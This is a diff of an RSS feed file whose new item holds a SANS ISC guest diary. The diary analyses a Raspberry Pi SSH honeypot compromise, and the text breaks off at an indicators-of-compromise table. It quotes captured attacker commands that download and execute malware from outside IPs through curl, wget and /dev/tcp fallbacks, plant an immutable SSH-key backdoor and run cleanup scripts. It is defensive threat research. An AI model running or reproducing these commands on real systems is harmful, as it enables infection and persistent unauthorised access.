@@ -1,5 +1,884 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Fri, 13 Jun 2025 01:59:20 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Automated Tools to Assist with DShield Honeypot Investigations &amp;#x5b;Guest Diary&amp;#x5d;</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>TIOBE Programming Index News June 2025: SQL Falls to Record Low Popularity</title><link>https://www.techrepublic.com/article/news-tiobe-programming-index-analysis-june-2025/</link><description>SQL has faded in popularity as people working in the field of AI switch to NoSQL databases.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4311455</guid><category>Artificial Intelligence</category><category>Developer</category><category>News</category><category>Software</category></item><item><title>Inside a Dark Adtech Empire Fed by Fake CAPTCHAs</title><link>https://krebsonsecurity.com/2025/06/inside-a-dark-adtech-empire-fed-by-fake-captchas/</link><description>Late last year, security researchers made a startling discovery: Kremlin-backed disinformation campaigns were bypassing moderation on social media platforms by leveraging the same malicious advertising technology that powers a sprawling ecosystem of online hucksters and website hackers. A new report on the fallout from that investigation finds this dark ad tech industry is far more resilient and incestuous than previously known.</description><content:encoded>&lt;p&gt;Late last year, security researchers made a startling discovery: Kremlin-backed disinformation campaigns were bypassing moderation on social media platforms by leveraging the same malicious advertising technology that powers a sprawling ecosystem of online hucksters and website hackers. A new report on the fallout from that investigation finds this dark ad tech industry is far more resilient and incestuous than previously known.&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Fri, 13 Jun 2025 02:59:17 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>&amp;#x5b;Guest Diary&amp;#x5d; Anatomy of a Linux SSH Honeypot Attack: Detailed Analysis of Captured Malware</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>&amp;#x5b;Guest Diary&amp;#x5d; Anatomy of a Linux SSH Honeypot Attack: Detailed Analysis of Captured Malware, (Fri, Jun 13th)</title><link>https://isc.sans.edu/diary/rss/32024</link><description>&lt;p&gt;&lt;span&gt;&lt;span&gt;&amp;#x26;#x5b;This is a Guest Diary by Michal Ambrozkiewicz, an ISC intern as part of the SANS.edu Bachelor&amp;#x26;&amp;#x26;#x23&amp;#x26;#x3b;39&amp;#x26;#x3b;s Degree in Applied Cybersecurity (BACS) program &amp;#x26;#x5b;1&amp;#x5d;.&amp;#x5d;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;&lt;span style="color: #ffffff;"&gt;&lt;span style="background-color: #e74c3c;"&gt;[This is a Guest Diary by Michal Ambrozkiewicz, an ISC intern as part of the SANS.edu Bachelor's Degree in Applied Cybersecurity (BACS) program [1].]&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;On April 29, 2025, my Raspberry Pi-based Cowrie SSH honeypot captured a sophisticated attack campaign targeting Linux systems. This wasn't just another automated scanner - the logs reveal a multi-stage attack involving SSH brute forcing, backdoor installation, and deployment of architecture-specific malware. In this post, I'll walk through the entire attack chain, from initial access to persistence mechanisms, providing both technical details for security professionals and explanations accessible to those newer to cybersecurity. By understanding how these attacks work in detail, we can better protect our systems from similar threats.&lt;/p&gt;
+
+&lt;p&gt;Welcome to my digital fishing expedition! I transformed a modest Raspberry Pi 5 into an irresistible target for cyber attackers by deploying Cowrie - an advanced SSH honeypot that mimics vulnerable systems while secretly documenting every keystroke and technique employed by unsuspecting intruders. Unlike simple packet logging, Cowrie creates an interactive playground where attackers believe they've gained access to a poorly secured Linux system, all while their tactics, tools, and techniques are meticulously recorded for our analysis. This sophisticated deception environment provides a fascinating window into the current attack landscape without putting any production systems at risk.&lt;/p&gt;
+
+&lt;p&gt;This approach gives us a front-row seat to the cybersecurity battlefield, where we can observe real-world adversaries' behaviors in their natural habitat rather than merely theorizing about potential attack vectors. The data collected here represents authentic attack techniques being deployed against systems worldwide at this very moment.&lt;/p&gt;
+
+&lt;p&gt;My setup includes:&lt;/p&gt;
+
+&lt;ul&gt;
+	&lt;li&gt;Raspberry Pi 5 running a customized Debian-based distribution&lt;/li&gt;
+	&lt;li&gt;Cowrie SSH honeypot configured to listen on port 2222 (forwarded to appear as port 22)&lt;/li&gt;
+	&lt;li&gt;JSON-based logging of all interactions&lt;/li&gt;
+	&lt;li&gt;Exposed public IP address with minimal firewall restrictions&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p style="text-align: center;"&gt;&lt;strong&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/2025-06-08_figure1.PNG" style="border-width: 1px; border-style: solid; width: 1000px; height: 1017px;" /&gt;&lt;br /&gt;
+Figure 1: Network diagram of a honeypot.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;The honeypot was configured to allow seemingly successful login attempts with weak credentials, giving attackers the impression they had gained access to a poorly secured Linux system [2].&lt;/p&gt;
+
+&lt;p style="text-align: center;"&gt;&lt;strong&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/2025-06-08_figure2.PNG" style="width: 800px; height: 559px;" /&gt;&lt;br /&gt;
+Figure 2: Status checking on honeypot functionality showing all systems working.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;h2&gt;Initial Access: The Hunt for Credentials&lt;/h2&gt;
+
+&lt;p&gt;The honeypot logs reveal numerous SSH brute force attempts throughout April 29th. The attackers used various source IPs but similar attack patterns, suggesting a coordinated campaign or use of compromised infrastructure. The successful compromise occurred at 17:25:32 UTC from IP address %%ip:196.251.70.219%%. The attacker's SSH client identified as &amp;quot;&lt;strong&gt;&lt;code&gt;SSH-2.0-Go&lt;/code&gt;&lt;/strong&gt;&amp;quot;, indicating the use of a Go-based scanning/exploitation tool. This is consistent with automated attack frameworks commonly used in large-scale campaigns.&lt;/p&gt;
+
+&lt;p&gt;The attacker successfully authenticated using:&lt;/p&gt;
+
+&lt;ul&gt;
+	&lt;li&gt;Username: &lt;strong&gt;&lt;code&gt;root&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
+	&lt;li&gt;Password: &lt;strong&gt;&lt;code&gt;abcd123456!&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This highlights a critical security issue many systems face - the use of simple, easily guessable passwords. Even in 2025, default or weak credentials remain one of the primary vectors for initial compromise.&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code class="language-bash"&gt;cat /home/raspberry/attack_timeline.txt | grep -A 5 "login.success" | grep "196.251.70.219"
+2025-04-29T17:25:32.830913Z 196.251.70.219 cowrie.session.connect
+2025-04-29T17:25:32.831335Z 196.251.70.219 cowrie.client.version
+2025-04-29T17:25:32.857270Z 196.251.70.219 cowrie.client.kex
+2025-04-29T17:25:33.137854Z 196.251.70.219 cowrie.login.success
+2025-04-29T17:25:48.681675Z 196.251.70.219 cowrie.session.params
+2025-04-29T17:25:48.682372Z 196.251.70.219 cowrie.command.input
+2025-04-29T17:25:48.715791Z 196.251.70.219 cowrie.session.file_download
+2025-04-29T17:25:48.717741Z 196.251.70.219 cowrie.session.file_upload
+2025-04-29T17:25:48.719845Z 196.251.70.219 cowrie.session.file_upload&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;h2&gt;Establishing Persistence&lt;/h2&gt;
+
+&lt;p&gt;Within seconds of gaining access, the attacker executed a series of commands to establish persistence. The attack was highly automated, with all actions occurring within a 15-second timeframe, suggesting a well rehearsed and scripted approach.&lt;/p&gt;
+
+&lt;p&gt;The main attack session began with the attacker uploading multiple files via SFTP:&lt;/p&gt;
+
+&lt;p style="text-align: center;"&gt;&lt;strong&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/2025-06-08_figure3.PNG" style="width: 1000px; height: 179px;" /&gt;&lt;br /&gt;
+Figure 3: Uploads observation.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;The most significant persistence mechanism was the installation of an SSH key into the &lt;strong&gt;&lt;code&gt;authorized_keys&lt;/code&gt;&lt;/strong&gt; file:&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code class="language-bash"&gt;mkdir -p ~/.ssh
+chattr -ia ~/.ssh/authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK2 \
+16q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv6 \
+6I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96h \
+u1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWp \
+O2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUs \
+lEf/zevIcX8+6H7kUMRr rsa-key-20230629" &amp;gt; ~/.ssh/authorized_keys
+chattr +ai ~/.ssh/authorized_keys&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;The &lt;strong&gt;&lt;code&gt;chattr +ai &lt;/code&gt;&lt;/strong&gt;command is particularly notable - it sets the &amp;quot;&lt;strong&gt;&lt;code&gt;append-only&lt;/code&gt;&lt;/strong&gt;&amp;quot; and &amp;quot;&lt;strong&gt;&lt;code&gt;immutable&lt;/code&gt;&lt;/strong&gt;&amp;quot; attributes on the &lt;strong&gt;&lt;code&gt;authorized_keys&lt;/code&gt;&lt;/strong&gt; file, making it difficult for system administrators or security tools to modify or remove the backdoor without specialized knowledge.&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;The attacker followed this by checking system information with uname -a and sending a confirmation message back to their infrastructure with the encoded string &lt;strong&gt;&lt;code&gt;\x61\x75\x74\x68\x5F\x6F\x6B\x0A&lt;/code&gt;&lt;/strong&gt; which decodes to &amp;quot;&lt;strong&gt;&lt;code&gt;auth_ok&lt;/code&gt;&lt;/strong&gt;&amp;quot; - signaling successful compromise.&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code class="language-bash"&gt;{"eventid":"cowrie.command.input","input":"chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; craspberry@pi5:~ $ echo -e "\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A"auth_ok&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;h2&gt;Malware Analysis: Hunting for Architecture-Specific Payloads&lt;/h2&gt;
+
+&lt;p&gt;The attacker came prepared with multiple malware variants tailored for different CPU architectures, ensuring successful infection regardless of the target system:&lt;/p&gt;
+
+&lt;ol&gt;
+	&lt;li&gt;&lt;strong&gt;&lt;code&gt;redtail.arm7&lt;/code&gt;&lt;/strong&gt; - Targeting older ARM-based devices (SHA-256: 2ef6bb55a79d81fbda6d574456a8c187f610c5ae2ddca38e32cf7cc50912b0bf) [3]&lt;/li&gt;
+	&lt;li&gt;&lt;strong&gt;&lt;code&gt;redtail.arm8&lt;/code&gt;&lt;/strong&gt; - For newer ARM64 architecture (SHA-256: fc8730fbe87bcbdc093a1ffbcb0028ccb4c24638e55d13fd853b07574f4cbe4a) [4]&lt;/li&gt;
+	&lt;li&gt;&lt;strong&gt;&lt;code&gt;redtail.i686&lt;/code&gt;&lt;/strong&gt; - For 32-bit x86 systems (SHA-256: 7780e72f7dea978946d4615c8db1b239d3e2c742cfc8be2934006b1fd6071110) [5]&lt;/li&gt;
+	&lt;li&gt;&lt;strong&gt;&lt;code&gt;redtail.x86_64&lt;/code&gt;&lt;/strong&gt; - For 64-bit x86 systems (SHA-256: b6ee8e08f1d4992ca85770e6883c1d2206ebbaf42f99d99aba0e26278de8bffb) [6]&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Beyond the SSH compromise, the logs also reveal alternative infection attempts targeting other vulnerable systems. In a separate session, the attacker attempted to download and execute binaries from external infrastructure:&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code class="language-bash"&gt;cd /tmp
+wget 209.141.34[.]106/PangaKenya/KKveTTgaAAsecNNaaaa.x86_64
+chmod +x KKveTTgaAAsecNNaaaa.x86_64
+./KKveTTgaAAsecNNaaaa.x86_64
+rm -rf KKveTTgaAAsecNNaaaa.x86_64&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;This &amp;quot;download, execute, delete&amp;quot; pattern is a common technique to avoid leaving malicious files on disk for security tools to detect. The logs also show a more complex fallback mechanism attempting to download malware through three different methods (curl, wget, and direct TCP socket) in case one fails:&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code class="language-bash"&gt;nohup $SHELL -c "curl http://202.55.82[.]250:60140/linux -o /tmp/mEpGt06b5j; 
+if [ ! -f /tmp/mEpGt06b5j ]; then 
+  wget http://202.55.82[.]250:60140/linux -O /tmp/mEpGt06b5j; 
+fi; 
+if [ ! -f /tmp/mEpGt06b5j ]; then 
+  exec 6&amp;lt;&amp;gt;/dev/tcp/202.55.82.250/60140 &amp;amp;&amp;amp; 
+  echo -n 'GET /linux' &amp;gt;&amp;amp;6 &amp;amp;&amp;amp; 
+  cat 0&amp;lt;&amp;amp;6 &amp;gt; /tmp/mEpGt06b5j; 
+  chmod +x /tmp/mEpGt06b5j &amp;amp;&amp;amp; 
+  /tmp/mEpGt06b5j [REDACTED ENCODED PARAMETERS];
+fi;" &amp;amp;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;The long encoded string included after the binary execution contains what appears to be configuration data or command and control information.&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code class="language-bash"&gt;{
+ "persistence_mechanism": {
+ "method": "SSH authorized key",
+ "key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1
+GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscV
+xegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBY
+hol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6
+FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1
+hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629",
+ "key_comment": "rsa-key-20230629",
+ "fingerprint": "SHA256:78gkKoLYeUW62etRipAiAw2jImcwCMnvC5BO9+3mOtY",
+ "protection": "chattr +ai (make file immutable)"
+ },
+ "command_sequence": "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setu
+p.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo
+\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0
+q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5y
+uZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1Gt
+hAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF
+6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/z
+evIcX8+6H7kUMRr rsa-key-20230629\" &amp;gt; ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authori
+zed_keys; uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\";"
+ },
+
+ "additional_malware_downloads": [
+ {
+ "timestamp": "2025-04-29T07:24:22.084908Z",
+ "attacker_ip": "176.65.148.181",
+ "malware_source": "209.141.34.106",
+ "malware_path": "/PangaKenya/",
+ "files": [
+ {
+ "filename": "KKveTTgaAAsecNNaaaa.x86_64",
+ "sha256": "811cd6ebeb9e2b7438ad9d7c382db13c1c04b7d520495261093af51797f5
+d4cc"
+ },
+ {
+ "filename": "KKveTTgaAAsecNNaaaa.x86",
+ "sha256": "9ac2e308b0b30354575bba88169283fa7439d34937a148ccb390bcec3c
+6e296b"
+ }
+ ],
+ "command": "cd /tmp; wget 209.141.34.106/PangaKenya/KKveTTgaAAsecNNaaaa.x86_6
+4; chmod +x KKveTTgaAAsecNNaaaa.x86_64; ./KKveTTgaAAsecNNaaaa.x86_64 ; rm -rf K
+KveTTgaAAsecNNaaaa.x86_64; wget 209.141.34.106/PangaKenya/KKveTTgaAAsecNNaaaa.
+x86; chmod +x KKveTTgaAAsecNNaaaa.x86; ./KKveTTgaAAsecNNaaaa.x86 ; rm -rf KKveT
+TgaAAsecNNaaaa.x86"
+ },
+ {
+ "timestamp": "2025-04-29T09:43:28.358260Z",
+ "attacker_ip": "47.236.58.21",
+ "malware_source": "202.55.82.250:60140",
+ "malware_path": "/linux",
+ "destination": "/tmp/mEpGt06b5j",
+ "download_mechanism": "Multiple fallbacks: curl ? wget ? direct socket",
+ "additional_actions": [
+ "Creates /tmp/.opass with password '12345678'",
+ "Executes with encoded command line parameters"
+ ],
+ "command_excerpt": "nohup $SHELL -c \"curl http://202.55.82.250:60140/linux -o /tm
+p/mEpGt06b5j; if [ ! -f /tmp/mEpGt06b5j ]; then wget http://202.55.82.250:60140/linux -O /
+tmp/mEpGt06b5j; fi; if [ ! -f /tmp/mEpGt06b5j ]; then exec 6&amp;lt;&amp;gt;/dev/tcp/202.55.82.250/601
+40 &amp;amp;&amp;amp; echo -n 'GET /linux' &amp;gt;&amp;amp;6 &amp;amp;&amp;amp; cat 0&amp;lt;&amp;amp;6 &amp;gt; /tmp/mEpGt06b5j ; chmod +x /tmp/mEpGt0
+6b5j &amp;amp;&amp;amp; /tmp/mEpGt06b5j CSKwgLxYG+KdmZqF+BdTqIG0M3R0..."
+ }
+ ],
+
+ "attack_campaign": {
+ "pattern": "Widespread SSH key installation across many IP addresses",
+ "common_actions": [
+ "ssh key installation",
+ "checking crontab entries",
+ "file immutability via chattr",
+ "removal of attack artifacts"
+ ],
+ "target": "Linux systems across multiple architectures"
+ }&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;h2&gt;Persistence Mechanisms: Staying Under the Radar&lt;/h2&gt;
+
+&lt;p&gt;In addition to the SSH key backdoor, the attackers employed multiple techniques to maintain access and resist removal attempts:&lt;/p&gt;
+
+&lt;h3&gt;1. File Attribute Manipulation&lt;/h3&gt;
+
+&lt;p&gt;The logs show consistent use of the &lt;strong&gt;&lt;code&gt;chattr&lt;/code&gt;&lt;/strong&gt; command to set immutable flags on files:&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code class="language-bash"&gt;chattr +ai ~/.ssh/authorized_keys&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;This prevents the file from being modified or deleted through normal means, complicating remediation efforts.&lt;/p&gt;
+
+&lt;h3&gt;2. Crontab Inspection&lt;/h3&gt;
+
+&lt;p&gt;The attackers routinely checked for scheduled tasks using &lt;strong&gt;&lt;code&gt;crontab -l&lt;/code&gt;&lt;/strong&gt; , likely to:&lt;/p&gt;
+
+&lt;ul&gt;
+	&lt;li&gt;Identify any security monitoring tools that might detect their presence&lt;/li&gt;
+	&lt;li&gt;Understand system maintenance schedules&lt;/li&gt;
+	&lt;li&gt;Find opportunities to add their own persistence mechanisms&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The logs show over 40 different sessions executing this command, indicating a systematic approach to reconnoitering compromised systems.&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code class="language-bash"&gt;crontab -l
+# Session 7332db45b083 (135.148.27.57) at 2025-04-29T01:36:43
+# Session 43583c947eab (45.55.187.1) at 2025-04-29T02:10:45
+# Session e2cfd359b841 (81.19.140.78) at 2025-04-29T03:00:37
+# Session 913f4c51570e (120.133.83.199) at 2025-04-29T03:34:14
+# Session 374ae6b1e98c (77.105.181.82) at 2025-04-29T03:47:04&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;h3&gt;3. Targeting Multiple Architectures&lt;/h3&gt;
+
+&lt;p&gt;By preparing malware for ARM7, ARM8, i686, and x86_64 architectures, the attackers ensured their ability to maintain presence across heterogeneous environments - from small IoT devices to server infrastructure.&lt;/p&gt;
+
+&lt;h3&gt;4. Cleanup Operations&lt;/h3&gt;
+
+&lt;p&gt;The attack chain included execution of a script named clean.sh which likely removed evidence of the intrusion from system logs and temporary directories. This &amp;quot;anti-forensics&amp;quot; approach makes detection more difficult for security teams.&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code class="language-bash"&gt; {
+ "eventid": "cowrie.session.file_upload",
+ "filename": "clean.sh",
+ "outfile": "var/lib/cowrie/downloads/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6
+fb3ab5388d2c5bc6a98e",
+ "shasum": "d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98
+e",
+ "message": "SFTP Uploaded file \"clean.sh\" to var/lib/cowrie/downloads/d46555af1173d
+22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e",
+ "sensor": "",
+ "timestamp": "2025-04-29T17:25:48.717741Z",
+ "src_ip": "196.251.70.219",
+ "session": "90db1182d123"
+ },
+ {
+ "eventid": "cowrie.command.input",
+ "input": "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.s
+h; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAA
+B3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7Ag
+vfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPX
+xg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrv
+aRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSm
+dw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUM
+Rr rsa-key-20230629\" &amp;gt; ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; unam
+e -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; ",
+ "message": "CMD: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh;
+sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"sshrsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7ne
+NVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEa
+DAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMt
+PAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfd
+mHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX
+8+6H7kUMRr rsa-key-20230629\" &amp;gt; ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_
+keys; uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; ",
+ "sensor": "",
+ "timestamp": "2025-04-29T17:25:48.682372Z",
+ "src_ip": "196.251.70.219",
+ "session": "90db1182d123"
+ }
+]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code&gt;[
+ {
+ "event_type": "command_execution",
+ "timestamp": "2025-04-29T17:25:48.682372Z",
+ "src_ip": "196.251.70.219",
+ "session": "90db1182d123",
+ "command_sequence": [
+ {
+ "phase": "cleanup_script_execution",
+ "commands": [
+ "chmod +x clean.sh",
+ "sh clean.sh",
+ "rm -rf clean.sh"
+ ]
+ },
+ {
+ "phase": "malware_installation",
+ "commands": [
+ "chmod +x setup.sh",
+ "sh setup.sh",
+ "rm -rf setup.sh"
+ ]
+ },
+ {
+ "phase": "persistence_establishment",
+ "commands": [
+ "mkdir -p ~/.ssh",
+ "chattr -ia ~/.ssh/authorized_keys",
+ "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAA[...truncated...]kUMRr rsa-key-20230629\"
+&amp;gt; ~/.ssh/authorized_keys",
+ "chattr +ai ~/.ssh/authorized_keys"
+ ]
+ },
+ {
+ "phase": "system_identification",
+ "commands": [
+ "uname -a"
+ ]
+ },
+ {
+ "phase": "callback_confirmation",
+ "commands": [
+ "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\""
+ ],
+ "decoded_message": "auth_ok"
+ }
+ ]
+ },
+ {
+ "event_type": "file_download",
+ "duplicate": true,
+ "outfile": "var/lib/cowrie/downloads/8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d4
+6e9dd3cc292b9849878b",
+ "shasum": "8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878
+b"
+ }
+]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code class="language-bash"&gt;chmod +x clean.sh; sh clean.sh; rm -rf clean.sh&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code class="language-bash"&gt;[
+ {
+ "eventid": "cowrie.command.input",
+ "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "message": "CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "sensor": "",
+ "timestamp": "2025-04-29T01:36:35.757277Z",
+ "src_ip": "135.148.27.57",
+ "session": "7332db45b083"
+ },
+ {
+ "eventid": "cowrie.command.input",
+ "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "message": "CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "sensor": "",
+ "timestamp": "2025-04-29T02:10:37.895619Z",
+ "src_ip": "45.55.187.1",
+ "session": "43583c947eab"
+ },
+ {
+ "eventid": "cowrie.command.input",
+ "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "message": "CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "sensor": "",
+ "timestamp": "2025-04-29T03:00:30.746579Z",
+ "src_ip": "81.19.140.78",
+ "session": "e2cfd359b841"
+ },
+ {
+ "eventid": "cowrie.command.input",
+ "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "message": "CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "sensor": "",
+ "timestamp": "2025-04-29T03:34:04.080390Z",
+ "src_ip": "120.133.83.199",
+ "session": "913f4c51570e"
+ },
+ {
+ "eventid": "cowrie.command.input",
+ "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "message": "CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh",
+ "sensor": "",
+ "timestamp": "2025-04-29T03:46:59.162406Z",
+ "src_ip": "77.105.181.82",
+ "session": "374ae6b1e98c"
+ }
+]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;h2&gt;Indicators of Compromise (IOCs)&lt;/h2&gt;
+
+&lt;h3&gt;IP Addresses&lt;br /&gt;
+&amp;nbsp;&lt;/h3&gt;
+
+&lt;table align="center" border="1" cellpadding="1" cellspacing="1" style="width: 1000px;"&gt;
+	&lt;thead&gt;
+		&lt;tr&gt;
+			&lt;th scope="col"&gt;IP Address&lt;/th&gt;
+			&lt;th scope="col"&gt;Role&lt;/th&gt;
